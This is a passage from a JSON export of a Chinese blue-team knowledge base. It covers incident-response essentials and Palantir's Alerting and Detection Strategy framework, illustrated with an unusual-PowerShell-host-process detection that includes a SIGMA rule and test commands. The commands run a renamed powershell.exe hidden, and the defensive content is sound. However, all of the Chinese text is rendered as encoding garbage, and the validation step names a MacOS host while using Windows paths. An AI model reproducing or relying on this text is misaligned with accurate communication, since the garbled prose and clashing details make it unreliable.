![MyaocH](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/MyaocH.jpg)\r\n  - å®‰å…¨æ“ä½œ\r\n    - ![Dvns8r](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/Dvns8r.jpg)\r\n  - è‡ªåŠ¨åŒ–å“åº”\r\n    - è‡ªåŠ¨è°ƒæŸ¥å’Œå“åº”åŠŸèƒ½é€šè¿‡ä»¥ä¸‹æ–¹å¼å¸®åŠ©æ‚¨çš„å®‰å…¨è¿è¥å›¢é˜Ÿï¼š\r\n      - ç¡®å®šå¨èƒæ˜¯å¦éœ€è¦é‡‡å–è¡ŒåŠ¨ã€‚\r\n      - é‡‡å–ï¼ˆæˆ–å»ºè®®ï¼‰ä»»ä½•å¿…è¦çš„è¡¥æ•‘æªæ–½ã€‚\r\n      - ç¡®å®šæ˜¯å¦ä»¥åŠåº”è¯¥è¿›è¡Œå“ªäº›å…¶ä»–è°ƒæŸ¥ã€‚\r\n      - æ ¹æ®éœ€è¦å¯¹å…¶ä»–è­¦æŠ¥é‡å¤è¯¥è¿‡ç¨‹ã€‚\r\n    - è­¦æŠ¥ä¼šåˆ›å»ºä¸€ä¸ªäº‹ä»¶ï¼Œè¯¥äº‹ä»¶å¯ä»¥å¯åŠ¨è‡ªåŠ¨è°ƒæŸ¥ã€‚è‡ªåŠ¨è°ƒæŸ¥ä¼šä¸ºæ¯æ¡è¯æ®åšå‡ºè£å†³ã€‚åˆ¤å†³å¯ä»¥æ˜¯ï¼š\r\n      - æ¶æ„çš„\r\n      - å¯ç–‘çš„\r\n      - æ²¡æœ‰å‘ç°å¨èƒ\r\n    - è¯†åˆ«æ¶æ„æˆ–å¯ç–‘å®ä½“çš„è¡¥æ•‘æªæ–½ã€‚è¡¥æ•‘æªæ–½çš„ç¤ºä¾‹åŒ…æ‹¬ï¼š\r\n      - å°†æ–‡ä»¶å‘é€åˆ°éš”ç¦»åŒº\r\n      - åœæ­¢è¿›ç¨‹\r\n      - éš”ç¦»è®¾å¤‡\r\n      - é˜»æ­¢ URL\r\n      - å…¶ä»–è¡Œä¸º\r\n  - æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… [Microsoft 365 Defender ä¸­çš„è¡¥æ•‘æªæ–½](https://docs.microsoft.com/en-us/microsoft-365/security/defender/m365d-remediation-actions?view=o365-worldwide)\r\n\r\n  # 3. æ€»ç»“\r\n  åº”æ€¥å“åº”æœ‰**äº”ä¸ªå…³é”®äº‹é¡¹ï¼š**\r\n\r\n  - è®°å½•åœ¨å‘ç”Ÿäº‹æ•…æ—¶è¦é‡‡å–çš„è€ƒè™‘ã€å†³å®šå’Œè¡ŒåŠ¨çš„**è¿‡ç¨‹**\r\n    - **åº”æ€¥å“åº”è®¡åˆ’:**è¯¦ç»†è¯´æ˜ç»„ç»‡ï¼ˆæˆ–è€…ï¼Œé€šå¸¸æ˜¯ç»„ç»‡çš„ç‰¹å®šéƒ¨åˆ†ï¼Œä¾‹å¦‚ SOCï¼‰ä¸ºå“åº”ç½‘ç»œäº‹ä»¶æ‰€åšçš„å·¥ä½œçš„æ€»ä½“æ–‡æ¡£\r\n    - **æŠ€æœ¯æ“ä½œæ‰‹å†Œ:**æŠ€æœ¯æ“ä½œæ‰‹å†Œæä¾›äº†æœ‰å…³ä¸€çº¿å›¢é˜Ÿï¼ˆä¾‹å¦‚ SOC æˆ– CSIRTï¼‰åœ¨å‘ç”Ÿç‰¹å®šäº‹ä»¶åœºæ™¯æ—¶åº”å¦‚ä½•å“åº”çš„è¯¦ç»†æŒ‡å¯¼ï¼ˆå¦‚ï¼šhttps://github.com/certsocietegenerale/IRM/tree/master/ENï¼‰\r\n    - **çŸ¥è¯†åº“:**æä¾›äº†æœ‰å…³æ”¯æŒå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªäº‹ä»¶åœºæ™¯çš„å“åº”çš„å…·ä½“æ“ä½œçš„è¯¦ç»†æŒ‡å¯¼\r\n  - ç†Ÿç»ƒå’Œç»éªŒä¸°å¯Œçš„äººå‘˜æ¥é¢†å¯¼ã€åè°ƒå’Œæ‰§è¡Œå¯¹äº‹ä»¶çš„å“åº”\r\n    - ä¸ä»…æ˜¯å¿…è¦çš„æŠ€èƒ½å’Œç»éªŒï¼Œè¿˜åŒ…æ‹¬æ›´å¹¿æ³›çš„ç½‘ç»œå®‰å…¨ã€IT å’Œä¸šåŠ¡ç­‰ç›¸å…³èƒ½åŠ›ï¼Œå¯ä»¥å‚è€ƒï¼š\r\n      - [NIST ç½‘ç»œå®‰å…¨åŠ³åŠ¨åŠ›æ¡†æ¶](https://niccs.cisa.gov/workforce-development/cyber-security-workforce-framework)\r\n      - [çŸ¥é“åˆ›å®‡ç ”å‘æŠ€èƒ½è¡¨](https://blog.knownsec.com/Knownsec_RD_Checklist/index.html)\r\n      - [ç½‘ç»œå®‰å…¨äº§ä¸šäººæ‰å²—ä½èƒ½åŠ›è¦æ±‚](http://www.miitxxzx.org.cn/module/download/downfile.jsp?classid=0&showname=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E5%B2%97%E4%BD%8D%E8%83%BD%E5%8A%9B%E8%A6%81%E6%B1%82(1).pdf&filename=a1082cbbb71e422487b2e2c30526d7ea.pdf)\r\n  - é€šè¿‡æ—¥å¿—è¿›è¡Œäº‹ä»¶è°ƒæŸ¥ï¼Œå¹¶å¸®åŠ©äº†è§£å‘ç”Ÿäº†ä»€ä¹ˆã€ä½•æ—¶ä»¥åŠå¦‚ä½•å‘ç”Ÿçš„\r\n    - åœ¨ç¡®å®šè¦å­˜å‚¨å“ªäº›æ—¥å¿—æ—¶ï¼Œè¿˜åº”è€ƒè™‘ä»»ä½•é€‚ç”¨çš„æ³•è§„ã€‚ä¾‹å¦‚ï¼ŒGDPR å¯¹â€œ[æ•°æ®æœ€å°åŒ–](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/principles/data-minimisation/)â€çš„è¦æ±‚æ„å‘³ç€å®‰å…¨æ—¥å¿—ä¸åº”åŒ…å«ä¸ªäººæ•°æ®\r\n    - æ—¥å¿—ä¿ç•™æœŸçš„é€‰æ‹©åº”å†æ¬¡ä¸å¯èƒ½çš„ç°å®å¨èƒå’Œè°ƒæŸ¥è¦æ±‚ä¿æŒä¸€è‡´;æ—¥å¿—çš„å­˜å‚¨æ—¶é—´åº”è¯¥æ˜¯å®ƒä»¬é€šå¸¸å¯¹å›¢é˜Ÿæœ‰ç”¨çš„æ—¶é—´ã€‚(ä¾‹å¦‚ï¼Œè¿™å¯èƒ½æ˜¯åŸºäºå¯èƒ½çš„æ”»å‡»è€…çš„å¹³å‡åœç•™æ—¶é—´ã€‚[FireEye çš„ 2021 M-TrendsæŠ¥å‘Š](https://content.fireeye.com/m-trends/rpt-m-trends-2021)ç¡®å®šäº†éå‹’ç´¢è½¯ä»¶è°ƒæŸ¥çš„ä¸­ä½åœç•™æ—¶é—´ä¸º 45 å¤©ï¼Œå…¶ä¸­ 25% çš„éå‹’ç´¢è½¯ä»¶è°ƒæŸ¥çš„åœç•™æ—¶é—´ä¸º 200 å¤šå¤©)\r\n  - æ‰§è¡Œ**éåˆ¶**å’Œ**æ ¹é™¤**è¡ŒåŠ¨ä»¥å‡è½»äº‹ä»¶é£é™©çš„æŠ€æœ¯\r\n    - **åŸºäºä¸»æœº/ç½‘ç»œ/èº«ä»½**\r\n  - **äº‹ä»¶å“åº”å›¢é˜Ÿçš„åè°ƒ**æŠ€æœ¯ï¼Œç”¨äºæ²Ÿé€šå’Œåä½œã€å§”æ´¾å’Œè·Ÿè¸ªå“åº”è¡ŒåŠ¨ä»¥åŠç®¡ç†äº¤ä»˜\r\n    - **æ²Ÿé€š:** å†…éƒ¨å’Œä¸å¤–éƒ¨åˆä½œä¼™ä¼´çš„åŒæ­¥ï¼ˆä¾‹å¦‚ï¼Œè§†é¢‘å’Œç”µè¯å‘¼å«å’Œä¼šè®®ï¼‰å’Œå¼‚æ­¥ï¼ˆä¾‹å¦‚ï¼Œæ–‡æœ¬èŠå¤©ï¼‰é€šä¿¡ã€‚\r\n    - **åä½œ:** åœ¨å†…éƒ¨å’Œä¸å¤–éƒ¨åˆä½œä¼™ä¼´çš„å·¥ä½œä¸Šè¿›è¡Œåä½œã€‚\r\n    - **ä»»åŠ¡è·Ÿè¸ª:** è®°å½•å“åº”äº‹ä»¶æ‰€éœ€çš„ä»»åŠ¡ï¼Œè·Ÿè¸ªæˆªæ­¢æ—¥æœŸã€å·¥ä½œé‡ã€çŠ¶æ€ã€å—è®©äººå’Œåç»­æ­¥éª¤ã€‚è¿™å¯ä»¥é€šè¿‡ç®€å•çš„ç”µå­è¡¨æ ¼æˆ– Jira ç­‰ä¸“ç”¨ä»»åŠ¡è·Ÿè¸ªç³»ç»Ÿæ¥å®ç°ã€‚\r\n    - **æŠ¥å‘Š:** æ•è·æ¯ä¸ªäº‹ä»¶çš„å…³é”®ç»Ÿè®¡æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨å¸¸è§çš„æ¨¡å¼ï¼Œå¦‚VERISï¼‰ï¼Œå¹¶è¾“å‡ºè¿™äº›æ•°æ®ä»¥å¯ç”¨ç®¡ç†æŠ¥å‘Šã€‚\r\n\r\n  # 4. å‚è€ƒ\r\n  - [https://medium.com/nerd-for-tech/how-to-plan-detect-assess-and-respond-to-information-security-incidents-by-using-iso-iec-27035-ed744c8b7cd5](https://medium.com/nerd-for-tech/how-to-plan-detect-assess-and-respond-to-information-security-incidents-by-using-iso-iec-27035-ed744c8b7cd5)\r\n  - [https://gabrielcurrie.medium.com/ready-for-nearly-anything-five-things-to-prepare-for-a-cyber-security-incident-4fc49d665488](https://gabrielcurrie.medium.com/ready-for-nearly-anything-five-things-to-prepare-for-a-cyber-security-incident-4fc49d665488)\r\n  - [https://docs.microsoft.com/en-us/microsoft-365/security/defender/incidents-overview?view=o365-worldwide#incidents-and-alerts-in-the-microsoft-365-defender-portal](https://docs.microsoft.com/en-us/microsoft-365/security/defender/incidents-overview?view=o365-worldwide#incidents-and-alerts-in-the-microsoft-365-defender-portal)\r\n  - [https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/cloud-security-incidents.html](https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/cloud-security-incidents.html)\r\n  - [https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf)\r\n  - [https://www.iso.org/standard/60803.html](https://www.iso.org/standard/60803.html)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/æ£€æµ‹å·¥ç¨‹/å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»/","title":"å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- æ£€æµ‹å·¥ç¨‹\r\n- å¨èƒæ£€æµ‹\r\n- Palantir\r\n- æ¡†æ¶\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\næœ‰æ•ˆçš„å¨èƒæ£€æµ‹æ˜¯ç¡®ä¿å®‰å…¨è¥è¿æ­£å¸¸è¿ä½œçš„å…³é”®è¦æ±‚ä¹‹ä¸€ï¼Œè¦å…ˆèƒ½â€œçœ‹è§â€ï¼Œæ‰èƒ½åšåç»­çš„å“åº”å’Œå¤„ç½®ï¼›å¯¹äºå®‰å…¨è¿è¥åŒå­¦æ¥è¯´ï¼Œåœ¨åˆ¶å®šæ£€æµ‹ç­–ç•¥å’ŒåæœŸè¿è¥æ—¶ä¼šé‡åˆ°å‡ ä¸ªé—®é¢˜ï¼š\r\n\r\n- ç¼ºä¹è§„èŒƒçš„æ–‡æ¡£å’Œæ ‡å‡†ï¼Œæ•´ä½“è´¨é‡éš¾ä»¥ä¿è¯ï¼Œå¯¼è‡´ä½è´¨é‡çš„æ£€æµ‹ç­–ç•¥éƒ¨ç½²åˆ°ç”Ÿäº§ç³»ç»Ÿï¼Œé€ æˆäº§ç”Ÿè¿‡å¤š/æ— æ•ˆçš„å‘Šè­¦ï¼ˆFalse Positiveï¼‰ä¼šé€ æˆå®‰å…¨å›¢é˜Ÿçš„ç–²æƒ«æ„Ÿå’Œä¸ä¿¡ä»»æ„Ÿï¼Œè€Œæ›´åŠ å±é™©çš„æ˜¯æ£€æµ‹ç­–ç•¥æœªè¦†ç›–çš„éƒ¨åˆ†ï¼ˆFalse Negativeï¼‰ï¼Œæˆ‘ä»¬æ— æ³•åº”å¯¹â€œæœªçŸ¥â€çš„é£é™©ã€‚\r\n- æ£€æµ‹è§„åˆ™äº§ç”Ÿçš„å®‰å…¨å‘Šè­¦ç¼ºå°‘æœ‰æ•ˆçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œæ— æ³•å¸®åŠ©å€¼ç­çš„åº”æ€¥äººå‘˜ï¼›ä»–ä»¬å¯èƒ½ä¸ç†Ÿæ‚‰æ¼æ´/åº”ç”¨çš„ç›¸å…³ä¿¡æ¯ã€æ— æ³•åˆ¤æ–­æ˜¯å¦ä¸ºè¯¯æŠ¥ã€å¦‚ä½•å¤„ç½®çš„çœŸå®å‘Šè­¦ç­‰ã€‚\r\n- æ²¡æœ‰ç‰ˆæœ¬æ§åˆ¶å’ŒåŒè¡Œè¯„å®¡ï¼Œå‘Šè­¦çš„ä¼˜å…ˆçº§å¯èƒ½ä¸ä¸€è‡´æˆ–ä¸æ˜ç¡®ã€‚\r\n\r\nPalantirçš„å®‰å…¨å›¢é˜Ÿåˆ†äº«äº†å†…éƒ¨æ˜¯å¦‚ä½•æ„å»ºå¨èƒæ£€æµ‹ç­–ç•¥çš„ï¼Œæå‡ºäº†è‡ªå·±çš„å¨èƒæ£€æµ‹æ¡†æ¶ï¼Œè¯•å›¾ä»æ–‡æ¡£æ¨¡æ¿ã€æµç¨‹å’Œçº¦å®šè§„åˆ™æ–¹é¢æ¥æé«˜æ£€æµ‹ç­–ç•¥çš„è´¨é‡å’Œæ•ˆç‡ã€‚\r\n\r\n# 2. å¨èƒæ£€æµ‹æ¡†æ¶â€”Alerting and Detection Strategy Frameworkï¼ˆADSï¼‰\r\n\r\nè¯¥æ¡†æ¶å¸®åŠ©æˆ‘ä»¬æ„å»ºæ£€æµ‹è§„åˆ™çš„ç”Ÿæˆã€æµ‹è¯•å’Œç®¡ç†ï¼ŒåŒ…å«ä»¥ä¸‹éƒ¨åˆ†ï¼š\r\n\r\n- ç›®æ ‡ï¼šç»™å‡ºäº†åº”è¯¥æ£€æµ‹çš„è¡Œä¸ºç±»å‹çš„ç®€çŸ­æ˜æ–‡æè¿°ã€‚\r\n- åˆ†ç±»ï¼šæä¾›äº†åˆ°MITRE ATT&CKç›¸å…³æ¡ç›®çš„æ˜ å°„ã€‚\r\n- ç­–ç•¥æ‘˜è¦ï¼šæè¿°äº†æ£€æµ‹ç­–ç•¥æ­£åœ¨å¯»æ‰¾ä»€ä¹ˆã€ä½¿ç”¨äº†å“ªäº›æŠ€æœ¯å’Œæ•°æ®æºã€ç›¸å…³ä¸Šä¸‹æ–‡ä»¥åŠå‡å°‘è¯¯æŠ¥çš„ä¼˜åŒ–æªæ–½ç­‰ã€‚\r\n- æŠ€æœ¯èƒŒæ™¯ï¼šæä¾›äº†è§£æ£€æµ‹ç­–ç•¥å’Œå‘Šè­¦æ‰€éœ€çš„è¯¦ç»†ä¿¡æ¯å’ŒèƒŒæ™¯ï¼›ç›®æ ‡æ˜¯ä¸ºè¿è¥äººå‘˜æä¾›ä¸€ä¸ªç‹¬ç«‹çš„å‚è€ƒï¼Œä»¥å¯¹ä»»ä½•æ½œåœ¨çš„å®‰å…¨å‘Šè­¦åšå‡ºåˆ¤æ–­ã€‚\r\n- ç›²ç‚¹å’Œå‡è®¾ï¼šæ²¡æœ‰æ£€æµ‹ç­–ç•¥æ˜¯ç»å¯¹å®Œç¾çš„ï¼Œè¯†åˆ«å‡è®¾å’Œç›²ç‚¹å¯ä»¥å¸®åŠ©å…¶ä»–å·¥ç¨‹å¸ˆäº†è§£æ£€æµ‹ç­–ç•¥å¯èƒ½è¢«ç»•è¿‡çš„å…·ä½“æƒ…å†µã€‚\r\n- è¯¯æŠ¥ï¼šç”±äºé…ç½®é”™è¯¯ã€ç¯å¢ƒç‰¹æ€§æˆ–å…¶ä»–éæ¶æ„åœºæ™¯è€Œå¯¼è‡´æ£€æµ‹ç­–ç•¥è¯¯æŠ¥çš„å·²çŸ¥å®ä¾‹ã€‚\r\n- éªŒè¯ï¼šåˆ—å‡ºäº†ç”Ÿæˆè§¦å‘æ­¤å‘Šè­¦æ‰€éœ€çš„æ­¥éª¤ï¼›ç±»ä¼¼å•å…ƒæµ‹è¯•ï¼Œå¯ä»¥æ˜¯ç”¨äºç”Ÿæˆå‘Šè­¦çš„POC/è„šæœ¬ç­‰ã€‚\r\n- ä¼˜å…ˆçº§ï¼šæè¿°äº†å„ç§å®‰å…¨å‘Šè­¦çº§åˆ«å’Œç›¸å…³æ ‡å‡†ã€‚\r\n- å“åº”ï¼šè§¦å‘æ­¤å‘Šè­¦æ—¶çš„ä¸€èˆ¬å“åº”æ­¥éª¤ï¼Œè¿™äº›æ­¥éª¤æŒ‡å¯¼è¿è¥äººå‘˜å¯¹å‘Šè­¦è¿›è¡Œåˆ†ç±»å’Œè°ƒæŸ¥ã€‚\r\n- å…¶ä»–èµ„æºï¼šå¯èƒ½æœ‰åŠ©äºç†è§£çš„ä»»ä½•å…¶ä»–å†…éƒ¨ã€å¤–éƒ¨æˆ–æŠ€æœ¯å‚è€ƒèµ„æ–™ã€‚\r\n\r\nåœ¨éƒ¨ç½²æ–°çš„æ£€æµ‹ç­–ç•¥ä¹‹å‰ï¼Œå¿…é¡»å®Œæˆä¸Šè¿°çš„æ¯ä¸ªéƒ¨åˆ†ã€‚è¿™ä¿è¯äº†ä»»ä½•å®‰å…¨å‘Šè­¦éƒ½æœ‰è¶³å¤Ÿçš„æ–‡æ¡£ï¼Œå¹¶ç»è¿‡éªŒè¯ã€‚æ‰€æœ‰æ–‡æ¡£éƒ½ä¼šå—ç‰ˆæœ¬æ§åˆ¶å’Œé›†ä¸­ç®¡æ§ï¼›åœ¨æ£€æµ‹ç­–ç•¥åç»­çš„ä¼˜åŒ–è¿­ä»£è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ä¸æ–­ä¿®æ”¹å˜æ›´å¯¹åº”çš„æ–‡æ¡£ï¼Œç¡®ä¿æ–‡æ¡£ä¿æŒæœ€æ–°çŠ¶æ€ã€‚\r\n\r\n# 3. å®é™…æ¡ˆä¾‹\r\n## ç­–ç•¥åç§°ï¼šUnusual-Powershell-Host-Process\r\n- **ç›®æ ‡**\r\n  - æ£€æµ‹â€œæ²¡æœ‰ PowerShell çš„ PowerShellâ€æ”»å‡»ï¼Œè¿™äº›æ´»åŠ¨æ¶‰åŠä¸ç›´æ¥è°ƒç”¨ powershell.exe æ‰§è¡Œçš„PowerShell å‘½ä»¤å’Œè„šæœ¬ã€‚\r\n- **åˆ†ç±»**\r\n  - [Execution / Powershell](https://attack.mitre.org/wiki/Technique/T1086)\r\n- **ç­–ç•¥æ‘˜è¦**\r\n  - è¯¥ç­–ç•¥çš„ä½œç”¨å¦‚ä¸‹ï¼š\r\n    - é€šè¿‡Windowsç³»ç»Ÿçš„ç»ˆç«¯agentç›‘æ§æ¨¡å—åŠ è½½ï¼ˆmodule loadsï¼‰è¡Œä¸º\r\n    - ç›‘æ§ä»»ä½•åŠ è½½ powershell DLL çš„è¿›ç¨‹ï¼ˆsystem.management.automation.dll æˆ–system.management.automation.ni.dllï¼‰\r\n    - æ’é™¤å·²çŸ¥è·¯å¾„/è¿›ç¨‹åçš„æ­£å¸¸powershellä¸»æœºè¿›ç¨‹ï¼ˆhost processesï¼‰\r\n    - å‘Šè­¦ä»»ä½•å¼‚å¸¸çš„powershellä¸»æœºè¿›ç¨‹ï¼ˆhost processesï¼‰\r\n  - SIGMAè§„åˆ™ç¤ºä¾‹å¦‚ä¸‹ï¼Œå…·ä½“å—ç¯‡å¹…é™åˆ¶å°±çœç•¥äº† :)\r\n    ```\r\n      title: Detection of PowerShell Execution via DLL\r\n      logsource:\r\n          category: process_creation\r\n          product: windows\r\n      detection:\r\n          selection1:\r\n              Image|endswith:\r\n                  - '\\\\rundll32.exe'\r\n          selection2:\r\n              Description|contains:\r\n                  - 'Windows-Hostprozess (Rundll32)'\r\n          selection3:\r\n              CommandLine|contains:\r\n                  - 'Default.GetString'\r\n                  - 'FromBase64String'\r\n          condition: (selection1 or selection2) and selection3\r\n    ```\r\n- **æŠ€æœ¯èƒŒæ™¯**\r\n  - PowerShell å‘½ä»¤å’Œè„šæœ¬å¯ä»¥é€šè¿‡åŠ è½½åº•å±‚ System.Management.Automation å‘½åç©ºé—´æ¥æ‰§è¡Œï¼Œè¯¥å‘½åç©ºé—´é€šè¿‡ .NET æ¡†æ¶å’Œ Windows å…¬å…±è¯­è¨€æ¥å£ (CLI) å…¬å¼€ï¼ŒPowershell å®é™…ä¸Šæ˜¯ä¸€ä¸ªåä¸ºsystem.management.automation.dll çš„ DLLï¼Œå®ƒä¹Ÿå¯èƒ½ä»¥æœ¬æœºæ˜ åƒæ ¼å¼å­˜åœ¨ï¼Œå¦‚system.management.automation.ni.dllã€‚\r\n  - Powershell DLL å¯ä»¥åŠ è½½åˆ°å¤šä¸ªè¿›ç¨‹ä¸­ï¼Œè¿™äº›è¿›ç¨‹ç§°ä¸º powershell ä¸»æœºè¿›ç¨‹ã€‚åŒ…æ‹¬ powershell.exe æˆ– powershell é›†æˆè„šæœ¬ç¯å¢ƒ (powershell_ise.exe) ã€ä»¥åŠ Exchange å’Œ Azure Active Directory çš„åŒæ­¥è¿›ç¨‹ç­‰ï¼›Powershell ä¸»æœºè¿›ç¨‹ä¸€èˆ¬éƒ½æœ‰å¾®è½¯ç­¾åçš„æ•°å­—ç­¾åã€‚\r\n  - æ”»å‡»è€…å–œæ¬¢åˆ©ç”¨ Powershellè¿›è¡Œæ”»å‡»ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ä¸ªé«˜çº§æ¥å£æ¥ä¸æ“ä½œç³»ç»Ÿäº¤äº’ï¼Œè€Œæ— éœ€åœ¨ Cã€C# æˆ– .NET ä¸­å¼€å‘åŠŸèƒ½ã€‚è™½ç„¶è®¸å¤šæ”»å‡»è€…ä¼šç›´æ¥ä½¿ç”¨Powershellè¿›ç¨‹ï¼Œä½†æ›´è€ç»ƒçš„æ”»å‡»è€…å¯èƒ½ä¼šé€‰æ‹©æ›´åŠ éšç§˜çš„æ–¹æ³•ï¼Œå°† powershell æ³¨å…¥éåŸç”Ÿçš„Powershellä¸»æœºè¿›ç¨‹æ¥ç»•è¿‡åº”ç”¨ç¨‹åºç™½åå•å’Œç¯å¢ƒé™åˆ¶ï¼Œè¯¦è§ï¼š[unmanaged powershell](https://github.com/leechristensen/UnmanagedPowerShell)\r\n  - è®¸å¤šå·¥å…·å…è®¸ä½¿ç”¨ DLL è¿è¡Œ PowerShellã€‚ä¾‹å¦‚ï¼Œâ€œPowerShdllâ€å’Œâ€œNoPowerShellâ€ ï¼Œä»–ä»¬ä¾èµ–äº LOLBINï¼ˆæ— è½åœ°æ”»å‡»æ–‡ä»¶ï¼‰ï¼Œå¦‚ rundll32.exeã€installutil.exeã€regsvcs.exeã€regasm.exe å’Œ regsvr32.exe æ¥è°ƒç”¨ DLLã€‚è¿™äº› LOLBIN ç”±å¾®è½¯ç­¾åå¹¶ç»å¸¸åˆ—å…¥ç™½åå•ã€‚å¦‚ä¸‹å›¾æ˜¯PowerShell ä½¿ç”¨ rundll32 è°ƒç”¨ DLL ï¼Œä¼šå‡ºç°ä¸€ä¸ªå¸¦æœ‰ PowerShell æ§åˆ¶å°çš„æ–°çª—å£ï¼Œè¿™æ˜¯è¿›ç¨‹ä¸­æ˜¯ä¸å­˜åœ¨powershell.exeçš„ã€‚\r\n  - ![07pyjj](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/07pyjj.jpg)\r\n- **ç›²ç‚¹å’Œå‡è®¾**\r\n  - è¯¥ç­–ç•¥ä¾èµ–äºä»¥ä¸‹å‡è®¾ï¼š\r\n    - Windowsç³»ç»Ÿçš„ç»ˆç«¯agentæ­£å¸¸è¿è¡Œ\r\n    - æ­£å¸¸ç›‘æ§æ‰€æœ‰æ¨¡å—åŠ è½½ï¼ˆmodule loadsï¼‰çš„è¡Œä¸º\r\n    - ç»ˆç«¯æ”¶é›†çš„æ—¥å¿—è¢«å‘å¾€SOC/SIEMç­‰å¹³å°\r\n    - SOC/SIEMåŠ è½½æ£€æµ‹ç­–ç•¥è¿›è¡Œåˆ†æ\r\n  - å¦‚æœè¿åä»»ä½•å‡è®¾ï¼Œå°±ä¼šå‡ºç°ç›²ç‚¹ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹å†…å®¹ä¼šè§¦å‘å‘Šè­¦ï¼š\r\n    - åˆæ³•çš„ Powershell ä¸»æœºè¿›ç¨‹è¢«æ»¥ç”¨ï¼ˆä¾‹å¦‚ powershell.exeï¼‰\r\n    - åˆ—å…¥ç™½åå•çš„ Powershell ä¸»æœºè¿›ç¨‹è¢«æ»¥ç”¨\r\n    - ç»ˆç«¯Agentè¢«æ”»å‡»è€…æ§åˆ¶\r\n- **è¯¯æŠ¥**\r\n  - æœ‰å‡ ç§æƒ…å†µä¼šå‘ç”Ÿè¯¯æŠ¥ï¼š\r\n    - åˆæ³•çš„ powershell è§¦å‘å‘Šè­¦ï¼Œå¹¶ä¸”æ²¡æœ‰é€šè¿‡ç™½åå•è¿›è¡ŒåŠ ç™½\r\n  - åˆæ³•çš„ powershell è¿›ç¨‹é€šå¸¸æœ‰å¦‚ä¸‹ç‰¹å¾ï¼š\r\n    - è°ƒç”¨æ–¹æœ‰åˆæ³•çš„æ•°å­—ç­¾å\r\n    - Powershell ä½¿ç”¨æ ‡å‡†æ–¹æ³•ï¼ˆä¾‹å¦‚ LoadLibraryï¼‰å°†æœ¬æœº Powershell åº“åŠ è½½åˆ°å†…å­˜ä¸­\r\n    - ä¿¡ä»»çš„äºŒè¿›åˆ¶æ–‡ä»¶\r\n- **ä¼˜å…ˆçº§**\r\n  - åœ¨æ‰€æœ‰æ¡ä»¶ä¸‹ï¼Œä¼˜å…ˆçº§éƒ½è®¾ç½®ä¸ºä¸­ç­‰\r\n- **éªŒè¯**\r\n  - é€šè¿‡åœ¨ MacOS ä¸»æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥éªŒè¯ï¼š\r\n    ```\r\n      Copy-Item C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -Destination C:\\\\windows\\\\temp\\\\unusual-powershell-host-process-test.exe -Force \r\n      Start-Process C:\\\\windows\\\\temp\\\\unusual-powershell-host-process-test.exe -ArgumentList '-NoProfile','-NonInteractive','-Windowstyle Hidden','-Command {Get-Date}' \r\n      Remove-Item 'C:\\\\windows\\\\temp\\\\unusual-powershell-host-process-test.exe' -Force -ErrorAction SilentlyContinue\r\n    ```\r\n- **å“åº”**\r\n  - å¦‚æœè§¦å‘æ­¤è­¦æŠ¥ï¼Œå»ºè®®é‡‡ç”¨ä»¥ä¸‹å“åº”ç¨‹åºï¼š\r\n    - å°†å¯ç–‘çš„ powershell è¿›ç¨‹ä¸ç™½åå•ä¸Šè¿›è¡Œæ¯”è¾ƒ\r\n      - è¯·æ³¨æ„æ˜¯å¦å­˜åœ¨ç”±äºè·¯å¾„æˆ–é©±åŠ¨å™¨å·å·®å¼‚å¯¼è‡´çš„å°é—®é¢˜\r\n    - æ£€æŸ¥æ•°å­—ç­¾å\r\n      - ä½¿ç”¨å·¥å…·æˆ– powershell æ¥ç¡®å®šäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¦ç»è¿‡æ•°å­—ç­¾å\r\n      - å¯¹ç­¾åè€…å’ŒäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œç½®ä¿¡åº¦ç¡®è®¤\r\n    - ç¡®å®šäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¦å¯¹åº”äºå·²å®‰è£…çš„åº”ç”¨ç¨‹åº\r\n      - æŸ¥çœ‹ osquery ä»¥æŸ¥æ‰¾å¯èƒ½ä¸äºŒè¿›åˆ¶æ–‡ä»¶åŒ¹é…çš„å·²å®‰è£…è½¯ä»¶åŒ…\r\n    - æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶çš„è¡Œä¸º\r\n      - æ˜¯å¦è¿›è¡Œäº†ä»»ä½•å¼‚å¸¸çš„ç½‘ç»œè¿æ¥ï¼Ÿ\r\n      - æ˜¯å¦äº§ç”Ÿäº†ä»»ä½•å­è¿›ç¨‹ï¼Ÿ\r\n      - 